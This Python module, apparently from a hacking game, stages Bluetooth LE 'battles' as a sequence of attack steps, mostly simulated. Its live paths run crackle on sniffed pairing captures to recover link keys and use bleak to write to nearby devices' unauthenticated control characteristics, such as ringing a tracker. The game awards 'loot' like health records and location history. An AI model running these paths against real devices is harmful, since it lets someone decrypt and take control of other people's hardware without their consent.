"""BLE battling: the Bluetooth analog of cracking a WiFi handshake, as a short
sequence of real attack techniques rather than a single roll.

The flow mirrors a real LE pairing attack:

  SNIFF        capture advertising + the LL connection (Ubertooth / Sniffle)
  RE-PAIR      send an SMP Pairing Request to force a fresh pairing exchange
               (so the key exchange is on the air to capture)
  BRUTE TK     crackle brute-forces the Temporary Key (Just Works -> 0;
               6-digit PIN -> 0..999999) -> STK -> LTK -> decrypt
  DOWNGRADE    KNOB-style entropy downgrade: coerce a 1-byte key so even an
               LE Secure Connections target's session key is brute-forceable
               (low odds -- this is the hard path to a "secure" boss)
  GATT WRITE   no decrypt needed -- take control by writing an unauthenticated
               characteristic (ring a tracker, toggle a bulb)

Owning a device yields its **LTK** (decrypt its traffic) plus class-specific
intel as loot. Real paths use ``crackle`` / ``bleak`` (guarded, sim-safe,
NEEDS ON-HARDWARE VALIDATION). ``battle_ble`` returns a battle()-style dict with
extra ``steps`` (the technique log, for the render) and ``loot``.
"""
from __future__ import annotations

import logging
import os
import random
import shutil
import subprocess

log = logging.getLogger(__name__)

# species -> a benign GATT "control" move: (label, characteristic-uuid, value).
_CONTROL = {
    "Trackling": ("ring it", "00002a06-0000-1000-8000-00805f9b34fb", b"\x02"),
    "Hearthkin": ("toggle power", "", b"\x01"),
    "Echobub": ("blast the volume", "", b"\x7f"),
    "Blip": ("hijack the beacon", "", b"\x01"),
    "Vitalix": ("spoof a reading", "", b"\x01"),
    "Cogling": ("poke it", "", b"\x01"),
}
_DEFAULT_CONTROL = ("poke it", "", b"\x01")

# species -> the intel you walk away with when you OWN the device.
_LOOT = {
    "Trackling": "location history", "Echobub": "audio intercept",
    "Hearthkin": "control token", "Vitalix": "health records",
    "Keytapper": "keystroke log", "Pocketling": "device profile",
    "Cogling": "device profile", "Blip": "beacon UUID",
    "Tickbit": "fitness data", "Pixie": "raw GATT dump",
}

_KNOB_CHANCE = 0.35        # odds a KNOB entropy-downgrade weakens a secure target


def control_move(monster):
    return _CONTROL.get(getattr(monster, "species", ""), _DEFAULT_CONTROL)


def _fake_ltk() -> str:
    return "".join(random.choice("0123456789abcdef") for _ in range(32))


def battle_ble(monster, cfg) -> dict:
    """Battle a BLE monster as a technique sequence. Sets monster.defeated/key on
    a win. Returns a battle()-style dict with ``steps`` + ``loot``."""
    pairing = getattr(monster, "pairing", "just_works") or "just_works"
    connectable = bool(getattr(monster, "connectable", True))
    loot = _LOOT.get(getattr(monster, "species", ""), "raw GATT dump")
    steps = [("SNIFF", "captured advertising + LL connection")]

    if pairing in ("just_works", "pin"):
        if pairing == "pin":
            steps.append(("RE-PAIR", "forced a fresh pairing exchange"))
        steps.append(("BRUTE TK", "TK=000000 (Just Works)" if pairing == "just_works"
                      else "TK brute 0..999999"))
        res = _do_crack(monster, cfg, pairing, via="crackle")
    else:                                   # LE Secure Connections
        if _downgrade(cfg):
            steps.append(("DOWNGRADE", "KNOB entropy downgrade -> 1-byte key"))
            steps.append(("BRUTE KEY", "weak session key brute-forced"))
            res = _do_crack(monster, cfg, "secure", via="knob+crackle")
        elif connectable:
            steps.append(("DOWNGRADE", "entropy downgrade FAILED"))
            label = control_move(monster)[0]
            steps.append(("GATT WRITE", label))
            res = _do_control(monster, cfg)
        else:
            steps.append(("DOWNGRADE", "entropy downgrade FAILED"))
            res = {"result": "immune", "via": "-", "key": "", "mode": "secure",
                   "note": "LE Secure Connections + not connectable -- can't be owned"}

    if res["result"] == "cracked":
        monster.defeated = True
        monster.key = res["key"]
        res["loot"] = loot
        steps.append(("OWNED", f"{res.get('note', '')} +{loot}"))
    elif res["result"] == "immune":
        steps.append(("IMMUNE", "resisted"))
    else:
        steps.append(("FAILED", res.get("note", "")))
    res["steps"] = steps
    return res


def _downgrade(cfg) -> bool:
    """KNOB entropy downgrade. Sim: a roll. Real: not implemented (KNOB is hard /
    mostly BR-EDR), so secure targets fall back to control/immune on hardware."""
    if not bool(getattr(cfg, "simulate", False)):
        return False
    return random.random() < _KNOB_CHANCE


# -- crack the pairing (crackle) --------------------------------------------
def _do_crack(monster, cfg, pairing: str, via: str) -> dict:
    if not bool(getattr(cfg, "simulate", False)):
        real = _crackle(monster, cfg)
        if real is not None:
            return real
    p = {"just_works": 0.95, "pin": 0.65, "secure": 0.9}.get(pairing, 0.8)
    if random.random() < p:
        return {"result": "cracked", "via": f"{via} (sim)", "key": _fake_ltk(),
                "mode": pairing, "note": f"LTK recovered ({pairing})"}
    return {"result": "failed", "via": f"{via} (sim)", "key": "", "mode": pairing,
            "note": "no pairing captured / TK not found"}


def _crackle(monster, cfg):
    """Real crackle on a sniffed pairing pcap. NEEDS ON-HARDWARE VALIDATION."""
    crackle = shutil.which(getattr(cfg, "crackle_bin", "crackle"))
    cap = getattr(monster, "capture_path", "") or ""
    if not crackle or not cap or not os.path.exists(cap):
        return None
    try:
        out = subprocess.run([crackle, "-i", cap], capture_output=True,
                             text=True, timeout=120)
    except Exception:  # noqa: BLE001
        return None
    ltk = _parse_ltk(out.stdout or "")
    if ltk:
        return {"result": "cracked", "via": "crackle", "key": ltk,
                "mode": "pairing", "note": "LTK recovered -- traffic decryptable"}
    return {"result": "failed", "via": "crackle", "key": "",
            "mode": "pairing", "note": "crackle found no key (LE Secure?)"}


def _parse_ltk(text: str) -> str:
    for line in text.splitlines():
        low = line.lower()
        if "ltk" in low and ":" in line:
            return line.split(":")[-1].strip().replace(" ", "")
    return ""


# -- control (GATT write) ---------------------------------------------------
def _do_control(monster, cfg) -> dict:
    action = control_move(monster)[0]
    if not bool(getattr(cfg, "simulate", False)):
        real = _gatt_write(monster, cfg)
        if real is not None:
            return real
    if random.random() < 0.7:
        return {"result": "cracked", "via": "gatt-write", "mode": "control",
                "key": f"(owned: {action})", "note": f"took control -- {action}"}
    return {"result": "failed", "via": "gatt-write", "mode": "control",
            "key": "", "note": f"could not {action}"}


def _gatt_write(monster, cfg):
    """bleak GATT write to the species' control characteristic. NEEDS
    ON-HARDWARE VALIDATION."""
    action, uuid, value = control_move(monster)
    if not uuid:
        return None
    try:
        import asyncio
        from bleak import BleakClient  # type: ignore
    except Exception:
        return None

    async def _go():
        async with BleakClient(str(monster.id),
                               timeout=getattr(cfg, "ble_tame_timeout", 8.0)) as c:
            await c.write_gatt_char(uuid, value, response=False)
            return True

    try:
        asyncio.run(_go())
        return {"result": "cracked", "via": "gatt-write", "mode": "control",
                "key": f"(owned: {action})", "note": f"took control -- {action}"}
    except Exception as exc:  # noqa: BLE001
        log.warning("gatt control failed (%s)", exc)
        return {"result": "failed", "via": "gatt-write", "mode": "control",
                "key": "", "note": f"could not {action}"}
